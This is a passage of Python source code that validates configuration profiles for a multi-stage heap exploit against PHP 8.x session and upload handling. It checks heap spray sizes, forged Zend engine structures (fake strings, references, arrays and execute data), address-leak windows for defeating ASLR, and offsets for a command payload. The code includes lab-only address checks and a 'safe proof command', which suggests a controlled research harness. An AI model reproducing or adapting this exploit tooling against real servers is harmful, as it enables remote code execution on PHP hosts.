        raise ProfileError("b1 forged field cannot contain the fake zend_string")
    nested_fillers = _bounded_int(b1["nested_fillers"], "b1.nested_fillers", 0, 4096)
    if 2 + head_count + 1 + tail_count + nested_fillers > max_input_vars:
        raise ProfileError("PHP 8.x trans-SID B1 fields exceed runtime.max_input_vars")
    prefix = _need_str(b1["expected_prefix"], "b1.expected_prefix")
    if not re.fullmatch(r"/[0-9]{2}B{5}", prefix):
        raise ProfileError("b1.expected_prefix must be an indexed eight-byte leak tag")
    if int(prefix[1:3]) != hit_index % 100:
        raise ProfileError("b1.expected_prefix index must match b1.hit_index")
    main_offset = parse_hex(b1["main_qword_offset"], "b1.main_qword_offset")
    if main_offset % 8 or main_offset + 8 > fake_len:
        raise ProfileError("b1.main_qword_offset must be aligned inside the disclosed value")
    _bounded_int(b1["min_dtor_hits"], "b1.min_dtor_hits", 2, 4096)
    delta_lo = parse_hex(b1["libphp_delta_min"], "b1.libphp_delta_min")
    delta_hi = parse_hex(b1["libphp_delta_max"], "b1.libphp_delta_max")
    if not 0 < delta_lo < delta_hi <= 0x100000000:
        raise ProfileError("b1 libphp/main delta window is invalid")

    a2 = _need_obj(recipe["a2"], "request_recipe.a2")
    _keys(a2, "request_recipe.a2", (
        "boundary_len", "session_value_len", "progress_value", "fillers", "file", "large_field",
    ))
    _bounded_int(a2["boundary_len"], "a2.boundary_len", 8, 128)
    _bounded_int(a2["session_value_len"], "a2.session_value_len", 1, 128)
    progress_value = _need_str(a2["progress_value"], "a2.progress_value")
    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", progress_value):
        raise ProfileError("a2.progress_value must be a bounded ASCII token")
    fillers = _need_obj(a2["fillers"], "a2.fillers")
    _keys(fillers, "a2.fillers", ("count", "name_len", "value_len"))
    filler_count = _bounded_int(fillers["count"], "a2.fillers.count", 0, 4096)
    _bounded_int(fillers["name_len"], "a2.fillers.name_len", 1, 128)
    _bounded_int(fillers["value_len"], "a2.fillers.value_len", 0, 4096)
    a2_file = _need_obj(a2["file"], "a2.file")
    _keys(a2_file, "a2.file", ("name", "filename", "value_len"))
    for key, maximum in (("name", 128), ("filename", 255)):
        token = _need_str(a2_file[key], f"a2.file.{key}")
        if len(token) > maximum or not re.fullmatch(r"[A-Za-z0-9_.-]+", token):
            raise ProfileError(f"a2.file.{key} must be a bounded ASCII token")
    _bounded_int(a2_file["value_len"], "a2.file.value_len", 0, 65536)
    large_field = _need_obj(a2["large_field"], "a2.large_field")
    _keys(large_field, "a2.large_field", ("name", "value_len", "stream_chunk"))
    large_name = _need_str(large_field["name"], "a2.large_field.name")
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,63}", large_name):
        raise ProfileError("a2.large_field.name must be a simple form field name")
    large_len = _bounded_int(
        large_field["value_len"], "a2.large_field.value_len", 128 * 1024 * 1024, 192 * 1024 * 1024
    )
    stream_chunk = _bounded_int(
        large_field["stream_chunk"], "a2.large_field.stream_chunk", page, 1024 * 1024
    )
    if not _power_of_two(stream_chunk) or large_len % stream_chunk:
        raise ProfileError("a2 stream chunk must be a power of two that divides the large field")
    if filler_count + 4 > max_input_vars:
        raise ProfileError("PHP 8.x trans-SID A2 fields exceed runtime.max_input_vars")

    b2 = _need_obj(recipe["b2"], "request_recipe.b2")
    _keys(b2, "request_recipe.b2", (
        "boundary_len", "session_value", "progress_value", "spray_count", "name_len",
        "value_len", "reference_offset", "fake_array_offset", "refcount",
    ))
    _bounded_int(b2["boundary_len"], "b2.boundary_len", 8, 128)
    for key in ("session_value", "progress_value"):
        token = _need_str(b2[key], f"b2.{key}")
        if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", token):
            raise ProfileError(f"b2.{key} must be a bounded ASCII token")
    spray_count = _bounded_int(b2["spray_count"], "b2.spray_count", 1, 4096)
    if spray_count + 2 > max_input_vars:
        raise ProfileError("PHP 8.x trans-SID B2 fields exceed runtime.max_input_vars")
    _bounded_int(b2["name_len"], "b2.name_len", 1, 128)
    value_len = _bounded_int(b2["value_len"], "b2.value_len", 1, page)
    reference_offset = parse_hex(b2["reference_offset"], "b2.reference_offset")
    fake_array_offset = parse_hex(b2["fake_array_offset"], "b2.fake_array_offset")
    if reference_offset >= chunk or fake_array_offset >= chunk:
        raise ProfileError("b2 forged offsets must stay inside one Zend MM chunk")
    if reference_offset % 8 or fake_array_offset % 8:
        raise ProfileError("b2 forged offsets must be pointer-aligned")
    if reference_offset // page != fake_array_offset // page:
        raise ProfileError("b2 stale reference and fake array must share one reclaim page")
    refcount = _bounded_int(b2["refcount"], "b2.refcount", 1, 2)
    del refcount
    zstring_val = abi["zend_string"]["val"]
    ref_start = reference_offset % page - zstring_val
    ref_end = ref_start + abi["zend_reference"]["size"]
    array_start = fake_array_offset % page - zstring_val
    _execute, _string, command_offset = layout_offsets(
        {key: {name: hex(number) for name, number in fields.items()} for key, fields in abi.items()}
    )
    array_end = array_start + command_offset + len(safe_proof_command("/out/" + "a" * 48)) + 1
    if ref_start < 0 or ref_end > value_len or array_start < 0 or array_end > value_len:
        raise ProfileError("b2 fake reference/array does not fit in the spray value")
    if max(ref_start, array_start) < min(ref_end, array_end):
        raise ProfileError("b2 fake reference overlaps the fake array payload")


def _validate_abi_bounds(abi: Mapping[str, Mapping[str, int]], source: str) -> None:
    widths = {
        "zend_string": {"len": 8, "val": 1},
        "zval": {"value": 8, "type_info": 4},
        "zend_reference": {"gc": 8, "val": abi["zval"]["size"], "sources": 8},
        "zend_array": {
            "gc": 8, "flags": 4, "table_mask": 4, "ar_data": 8, "num_used": 4,
            "num_elements": 4, "table_size": 4, "internal_pointer": 4,
            "next_free": 8, "destructor": 8,
        },
        "zend_execute_data": {
            "opline": 8, "call": 8, "return_value": 8, "func": 8, "this": 8,
            "num_args": 4, "prev": 8, "symbol_table": 8, "call_info": 8,
        },
    }
    for struct_name, fields in widths.items():
        size = (
            abi[struct_name]["size_before_val"] + 1
            if struct_name == "zend_string"
            else abi[struct_name]["size"]
        )
        if size < 1:
            raise ProfileError(f"{source}.abi.{struct_name}.size must be positive")
        for field, width in fields.items():
            if abi[struct_name][field] + width > size:
                raise ProfileError(f"{source}.abi.{struct_name}.{field} exceeds structure size")
    if abi["zend_string"]["size_before_val"] != abi["zend_string"]["val"]:
        raise ProfileError("payload overlay invariant failed: zend_string header/val")
    execute_base = abi["zend_array"]["table_size"]
    if abi["zend_array"]["destructor"] != execute_base + abi["zend_execute_data"]["return_value"]:
        raise ProfileError("payload overlay invariant failed: destructor/return_value")
    if abi["zend_execute_data"]["arg1"] != abi["zend_execute_data"]["size"]:
        raise ProfileError("payload overlay invariant failed: arg1 must equal execute-data size")


def layout_offsets(abi: Mapping[str, Any]) -> tuple[int, int, int]:
    """Return execute base, fake-string base and command byte offset."""
    zarray = {k: parse_hex(v, f"abi.zend_array.{k}") for k, v in abi["zend_array"].items()}
    execute = {k: parse_hex(v, f"abi.zend_execute_data.{k}") for k, v in abi["zend_execute_data"].items()}
    zval = {k: parse_hex(v, f"abi.zval.{k}") for k, v in abi["zval"].items()}
    zstring = {k: parse_hex(v, f"abi.zend_string.{k}") for k, v in abi["zend_string"].items()}
    execute_base = zarray["table_size"]
    string_base = execute_base + execute["size"] + zval["size"]
    command_offset = string_base + zstring["val"]
    return execute_base, string_base, command_offset


def _validate_stage3(
    stage3: dict[str, Any],
    abi: Mapping[str, Mapping[str, int]],
    page: int,
    chunk: int,
    max_input_vars: int,
) -> None:
    strategy = stage3.get("strategy")
    if strategy == "fixed-carrier-v1":
        _keys(stage3, "stage3", (
            "strategy", "htdata_offset", "pads", "prime_fields", "prime_value_len", "carrier_copies",
        ))
        htdata = parse_hex(stage3["htdata_offset"], "stage3.htdata_offset")
        if htdata >= chunk:
            raise ProfileError("stage3.htdata_offset must be inside one Zend MM chunk")
        pads = _need_list(stage3["pads"], "stage3.pads")
        if not pads:
            raise ProfileError("stage3.pads must not be empty")
        pad_fields = 0
        for idx, pad in enumerate(pads):
            pobj = _need_obj(pad, f"stage3.pads[{idx}]")
            _keys(pobj, f"stage3.pads[{idx}]", ("name_len", "value_len", "repeat"))
            name_len = _need_int(pobj["name_len"], "name_len")
            value_len = _need_int(pobj["value_len"], "value_len")
            repeat = _need_int(pobj["repeat"], "repeat", 1)
            if name_len > 4096 or value_len > 4096 or repeat > 512:
                raise ProfileError("fixed-carrier pad exceeds safe size/repeat bounds")
            pad_fields += repeat
        if pad_fields + 3 > max_input_vars:
            raise ProfileError("fixed-carrier trigger exceeds runtime.max_input_vars")
        prime_fields = _need_int(stage3["prime_fields"], "stage3.prime_fields")
        if prime_fields > 512:
            raise ProfileError("fixed-carrier prime_fields exceeds the safety bound")
        if _need_int(stage3["prime_value_len"], "stage3.prime_value_len") != 15:
            raise ProfileError("fixed-carrier-v1 currently requires prime_value_len=15")
        carrier_copies = _need_int(stage3["carrier_copies"], "stage3.carrier_copies", 1)
        if carrier_copies > 512 or prime_fields + carrier_copies + 3 > max_input_vars:
            raise ProfileError("fixed-carrier consumer exceeds safe/runtime input bounds")
        return
    if strategy != "r0-spray-v1":
        raise ProfileError(f"unsupported stage3 strategy: {strategy!r}")
    _keys(stage3, "stage3", (
        "strategy", "trigger_pads", "r0_search", "spray", "pre_session_fields",
    ))
    trigger_pads = _need_int(stage3["trigger_pads"], "stage3.trigger_pads")
    if trigger_pads > 4096 or trigger_pads + 3 > max_input_vars:
        raise ProfileError("stage3.trigger_pads exceeds safe/runtime input bounds")
    search = _need_obj(stage3["r0_search"], "stage3.r0_search")
    _keys(search, "stage3.r0_search", ("page_lo", "page_hi_exclusive", "page_step", "lowbits", "releak_every"))
    lo = parse_hex(search["page_lo"], "page_lo")
    hi = parse_hex(search["page_hi_exclusive"], "page_hi_exclusive")
    step = parse_hex(search["page_step"], "page_step")
    if not (0 <= lo < hi <= chunk) or lo % page or hi % page or step < page or step % page:
        raise ProfileError("r0 page search must be page-aligned and contained in one Zend MM chunk")
    lowbits = _need_list(search["lowbits"], "lowbits")
    if not lowbits:
        raise ProfileError("r0 lowbits must not be empty")
    parsed_lows = [parse_hex(x, "r0 lowbit") for x in lowbits]
    if len(parsed_lows) > 64:
        raise ProfileError("r0 lowbits exceeds the 64-entry safety bound")
    if len(set(parsed_lows)) != len(parsed_lows):
        raise ProfileError("r0 lowbits must be unique")
    _need_int(search["releak_every"], "releak_every", 1)
    spray = _need_obj(stage3["spray"], "stage3.spray")
    _keys(spray, "stage3.spray", ("value_len", "count", "ht_page_offset"))
    value_len = _need_int(spray["value_len"], "spray.value_len", 1)
    spray_count = _need_int(spray["count"], "spray.count", 1)
    if spray_count > 4096 or spray_count + 2 > max_input_vars:
        raise ProfileError("spray.count exceeds safe/runtime input bounds")
    ht_page = parse_hex(spray["ht_page_offset"], "spray.ht_page_offset")
    zstring_val = abi["zend_string"]["val"]
    if value_len + zstring_val + 1 != page:
        raise ProfileError("spray value plus zend_string header and NUL must fill exactly one page")
    _, _, command_offset = layout_offsets({k: {n: hex(v) for n, v in vals.items()} for k, vals in abi.items() if k != "types"} | {"types": {n: hex(v) for n, v in abi["types"].items()}})
    ht_start = ht_page - zstring_val
    longest_command = safe_proof_command("/out/" + "a" * 48)
    ht_end = ht_start + command_offset + len(longest_command) + 1
    if ht_start < 0 or ht_end > value_len:
        raise ProfileError("fake HashTable/string does not fit in the spray value")
    pre = _need_obj(stage3["pre_session_fields"], "stage3.pre_session_fields")
    _keys(pre, "stage3.pre_session_fields", ("count", "value_len", "name_prefix"))
    pre_count = _need_int(pre["count"], "pre_session_fields.count")
    pre_value_len = _need_int(pre["value_len"], "pre_session_fields.value_len", 1)
    prefix = _need_str(pre["name_prefix"], "pre_session_fields.name_prefix")
    if pre_count > 64 or pre_count >= spray_count:
        raise ProfileError("pre-session field count must be below spray.count and at most 64")
    if pre_value_len > 4096:
        raise ProfileError("pre-session field value length exceeds safe profile bounds")
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,27}", prefix):
        raise ProfileError("pre-session field name prefix is invalid")
    ref_size = abi["zend_reference"]["size"]
    for low in parsed_lows:
        if low < zstring_val or low >= page:
            raise ProfileError("r0 lowbit is outside the reclaim page")
        ref_start = low - zstring_val
        ref_end = ref_start + ref_size
        if ref_end > value_len:
            raise ProfileError("fake reference does not fit in the spray value")
        if max(ref_start, ht_start) < min(ref_end, ht_end):
            raise ProfileError("fake reference overlaps fake HashTable/string")


def load_profile(path: str | Path) -> Profile:
    data, raw = load_json(path)
    validate_profile(data, source=str(path))
    return Profile(Path(path), _freeze(data), hashlib.sha256(raw).hexdigest())


def require_verified(profile: Profile) -> None:
    state = profile.raw["verification"]["state"]
    if state != "verified":
        raise ProfileError(
            f"profile {profile.id!r} is {state!r}; only locally verified profiles may run"
        )


def _parse_time(value: str) -> datetime:
    try:
        result = datetime.fromisoformat(value.replace("Z", "+00:00"))
    except ValueError as exc:
        raise ProfileError(f"invalid RFC3339 timestamp: {value!r}") from exc
    if result.tzinfo is None:
        raise ProfileError("timestamps must include a timezone")
    return result.astimezone(timezone.utc)


def validate_target_manifest(profile: Profile, path: str | Path) -> Mapping[str, Any]:
    data, _ = load_json(path)
    _keys(data, "target manifest", (
        "schema_version", "profile_id", "profile_sha256", "created_at", "expires_at",
        "image", "libphp_sha256", "runtime", "resolved_addresses",
    ))
    if data["schema_version"] != 1 or data["profile_id"] != profile.id:
        raise ProfileError("target manifest does not name this profile")
    if data["profile_sha256"] != profile.file_sha256:
        raise ProfileError("target manifest profile hash mismatch")
    image = _need_obj(data["image"], "target manifest.image")
    _keys(image, "target manifest.image", ("repo_digest", "image_id", "platform"))
    if image != dict(profile.raw["build"]["image"]):
        raise ProfileError("target manifest image fingerprint mismatch")
    if data["libphp_sha256"] != profile.raw["build"]["libphp"]["sha256"]:
        raise ProfileError("target manifest libphp hash mismatch")
    runtime = _need_obj(data["runtime"], "target manifest.runtime")
    if runtime != dict(profile.raw["runtime"]):
        raise ProfileError("target manifest runtime fingerprint mismatch")
    created = _parse_time(_need_str(data["created_at"], "target manifest.created_at"))
    expires = _parse_time(_need_str(data["expires_at"], "target manifest.expires_at"))
    now = datetime.now(timezone.utc)
    if expires <= now or created > now.replace(microsecond=0):
        raise ProfileError("target manifest is expired or from the future")
    if (expires - created).total_seconds() > 3600 or expires <= created:
        raise ProfileError("target manifest lifetime must be between 1 second and 1 hour")
    addresses = _need_list(data["resolved_addresses"], "target manifest.resolved_addresses")
    if not addresses:
        raise ProfileError("target manifest needs at least one resolved address")
    normalized: list[str] = []
    for raw_addr in addresses:
        value = _need_str(raw_addr, "target manifest address")
        try:
            addr = ipaddress.ip_address(value)
        except ValueError as exc:
            raise ProfileError(f"invalid target manifest address: {value!r}") from exc
        if isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:
            addr = addr.ipv4_mapped
        if not is_allowed_lab_address(addr):
            raise ProfileError(f"target manifest contains a non-lab address: {addr}")
        normalized.append(str(addr))
    if len(set(normalized)) != len(normalized):
        raise ProfileError("target manifest addresses must be unique")
    return _freeze(data)


def profile_as_mutable(profile: Profile) -> dict[str, Any]:
    """Deep-copy a frozen profile for the offline calibration helper."""
    def thaw(value: Any) -> Any:
        if isinstance(value, Mapping):
            return {key: thaw(item) for key, item in value.items()}
        if isinstance(value, tuple):
            return [thaw(item) for item in value]
        return value

    return thaw(profile.raw)

